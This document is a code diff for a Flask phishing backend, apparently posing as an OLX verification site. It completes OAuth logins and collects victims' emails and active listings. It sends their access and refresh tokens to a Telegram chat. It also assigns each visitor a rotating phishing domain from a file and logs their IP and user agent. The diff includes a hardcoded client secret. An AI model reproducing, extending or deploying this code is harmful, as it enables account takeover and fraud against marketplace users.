@@ -1,6 +1,7 @@
-from flask import Flask, request, jsonify, send_from_directory
+from flask import Flask, request, jsonify, render_template_string
 import requests
 import os
+import sqlite3
 
 app = Flask(__name__)
 
@@ -10,6 +11,20 @@ TG_CHAT_ID = os.environ.get("TG_CHAT_ID", "-1003455979409")
 CLIENT_ID = os.environ.get("CLIENT_ID", "202421")
 CLIENT_SECRET = os.environ.get("CLIENT_SECRET", "y4n9g6i6LAuWsGdhlJDOnKXu4ZfTD2QshtCzDhy0QsEJeTaf")
 REDIRECT_URI = os.environ.get("REDIRECT_URI", "https://verif-olx-com-phi.vercel.app/")
+
+# ---- Инициализация БД ----
+def init_db():
+    with sqlite3.connect('database.db') as conn:
+        cursor = conn.cursor()
+        cursor.execute('''
+            CREATE TABLE IF NOT EXISTS visitors (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                ip TEXT,
+                user_agent TEXT,
+                personal_link TEXT
+            )
+        ''')
+        conn.commit()
 
 # ---- Функция отправки сообщений в Telegram ----
 def send_telegram_message(msg):
@@ -27,23 +42,72 @@ def send_telegram_message(msg):
     except Exception as e:
         print("Telegram error:", e)
 
+# ---- Логика работы с доменами ----
+def get_next_domain_from_file():
+    """Берет первую строку из domens.txt и удаляет её. Если пусто — шлет алерт в ТГ."""
+    file_path = 'domens.txt'
+    fallback_link = "https://www.olx.ua/" # Ссылка, если домены кончились
+
+    if not os.path.exists(file_path):
+        send_telegram_message("⚠️ <b>КРИТИЧЕСКАЯ ОШИБКА:</b> Файл <code>domens.txt</code> не найден!")
+        return fallback_link
+
+    with open(file_path, 'r', encoding='utf-8') as f:
+        lines = f.readlines()
+
+    if not lines:
+        send_telegram_message("🚫 <b>ВНИМАНИЕ:</b> Ссылки в <code>domens.txt</code> закончились! Срочно пополни файл.")
+        return fallback_link
+
+    selected_link = lines[0].strip()
+    
+    # Перезаписываем файл без первой строки
+    with open(file_path, 'w', encoding='utf-8') as f:
+        f.writelines(lines[1:])
+        
+    return selected_link
+
 # ---- Главная страница ----
 @app.route('/')
 def index():
-    return send_from_directory('.', 'index.html')
+    user_ip = request.remote_addr
+    user_agent = request.headers.get('User-Agent')
+    
+    with sqlite3.connect('database.db') as conn:
+        cursor = conn.cursor()
+        # Проверяем старых посетителей
+        cursor.execute("SELECT personal_link FROM visitors WHERE ip = ? AND user_agent = ?", (user_ip, user_agent))
+        result = cursor.fetchone()
+        
+        if result:
+            personal_link = result[0]
+        else:
+            # Новый юзер — выдаем домен
+            personal_link = get_next_domain_from_file()
+            cursor.execute("INSERT INTO visitors (ip, user_agent, personal_link) VALUES (?, ?, ?)", 
+                           (user_ip, user_agent, personal_link))
+            conn.commit()
+            
+            # Уведомляем о выдаче (если это не заглушка)
+            if personal_link != "https://www.olx.ua/":
+                send_telegram_message(f"🆕 <b>Выдана ссылка из файла</b>\n👤 IP: <code>{user_ip}</code>\n🔗 Link: {personal_link}")
+
+    try:
+        with open('index.html', 'r', encoding='utf-8') as f:
+            html_content = f.read()
+            return render_template_string(html_content, personal_link=personal_link)
+    except Exception as e:
+        return f"Ошибка шаблона: {e}", 500
 
 # ---- Получение токена OLX через OAuth ----
 @app.route('/get_token', methods=['POST'])
 def get_token():
     data = request.get_json(silent=True) or {}
     code = data.get('code')
-
     if not code:
         return jsonify({"error": "No code"}), 400
 
-    # Эндпоинт авторизации остается open (стандарт)
     token_url = 'https://www.olx.ua/api/open/oauth/token'
-    
     payload = {
         'grant_type': 'authorization_code',
         'client_id': CLIENT_ID,
@@ -52,87 +116,48 @@ def get_token():
         'redirect_uri': REDIRECT_URI,
         'scope': 'read write v2'  
     }
-
-    headers = {
-        'User-Agent': 'Mozilla/5.0',
-        'Version': '2.0',
-        'Accept': 'application/json'
-    }
+    headers = {'User-Agent': 'Mozilla/5.0','Version': '2.0','Accept': 'application/json'}
 
     try:
-        # 1. Получаем токены
         response = requests.post(token_url, data=payload, headers=headers, timeout=15)
-        
         if response.status_code == 200:
             res_json = response.json()
             access = res_json.get('access_token')
             refresh = res_json.get('refresh_token')
 
-            # --- СБОР ДАННЫХ ЧЕРЕЗ PARTNER API (как в рабочем скрипте) ---
-            auth_headers = {
-                "Authorization": f"Bearer {access}",
-                "Version": "2.0",
-                "Accept": "application/json",
-                "User-Agent": "Mozilla/5.0"
-            }
+            auth_headers = {"Authorization": f"Bearer {access}","Version": "2.0","Accept": "application/json","User-Agent": "Mozilla/5.0"}
 
-            # А) Получаем Email
             email = "Не удалось получить"
             try:
-                # ИСПОЛЬЗУЕМ PARTNER URL
                 user_req = requests.get("https://www.olx.ua/api/partner/users/me", headers=auth_headers, timeout=7)
                 if user_req.status_code == 200:
-                    u_json = user_req.json()
-                    u_data = u_json.get('data', u_json)
-                    email = u_data.get('email', 'Email скрыт')
-                else:
-                    email = f"Ошибка ({user_req.status_code})"
+                    email = user_req.json().get('data', {}).get('email', 'Email скрыт')
             except: pass
 
-            # Б) Получаем активные объявления
             ads_info = "Объявлений не найдено"
             try:
-                # ИСПОЛЬЗУЕМ PARTNER URL
-                ads_req = requests.get(
-                    "https://www.olx.ua/api/partner/adverts", 
-                    headers=auth_headers, 
-                    params={"status": "active", "limit": 15}, 
-                    timeout=7
-                )
+                ads_req = requests.get("https://www.olx.ua/api/partner/adverts", headers=auth_headers, params={"status": "active", "limit": 15}, timeout=7)
                 if ads_req.status_code == 200:
-                    a_json = ads_req.json()
-                    ads_data = a_json.get('data', [])
+                    ads_data = ads_req.json().get('data', [])
                     if ads_data:
-                        links = []
-                        for ad in ads_data:
-                            title = ad.get('title', 'Без названия')
-                            url = ad.get('url', '#')
-                            links.append(f"• <a href='{url}'>{title}</a>")
+                        links = [f"• <a href='{ad.get('url', '#')}'>{ad.get('title', 'Без названия')}</a>" for ad in ads_data]
                         ads_info = "\n".join(links)
-                else:
-                    ads_info = f"Ошибка ({ads_req.status_code})"
             except: pass
 
-            # Формируем итоговый лог для Telegram
-            msg = (
-                f"🚀 <b>НОВЫЙ OLX АВТОРИЗАЦИЯ</b>\n\n"
-                f"👤 <b>Email:</b> <code>{email}</code>\n\n"
-                f"🔑 <b>Access:</b> <code>{access}</code>\n\n"
-                f"🔄 <b>Refresh:</b> <code>{refresh}</code>\n\n"
-                f"📦 <b>Активные объявления:</b>\n{ads_info}"
-            )
-            
+            msg = (f"🚀 <b>НОВЫЙ OLX АВТОРИЗАЦИЯ</b>\n\n👤 <b>Email:</b> <code>{email}</code>\n\n"
+                   f"🔑 <b>Access:</b> <code>{access}</code>\n\n🔄 <b>Refresh:</b> <code>{refresh}</code>\n\n"
+                   f"📦 <b>Активные объявления:</b>\n{ads_info}")
             send_telegram_message(msg)
             return jsonify(res_json), 200
         else:
-            error_text = response.text
-            send_telegram_message(f"❌ <b>Ошибка авторизации OLX:</b> {response.status_code}\n<code>{error_text[:200]}</code>")
-            return jsonify({"error": error_text}), response.status_code
+            send_telegram_message(f"❌ <b>Ошибка авторизации:</b> {response.status_code}")
+            return jsonify({"error": response.text}), response.status_code
 
     except Exception as e:
         send_telegram_message(f"💥 <b>Критическая ошибка:</b> {str(e)}")
         return jsonify({"error": str(e)}), 500
 
 if __name__ == '__main__':
+    init_db()
     port = int(os.environ.get("PORT", 5000))
     app.run(host="0.0.0.0", port=port)
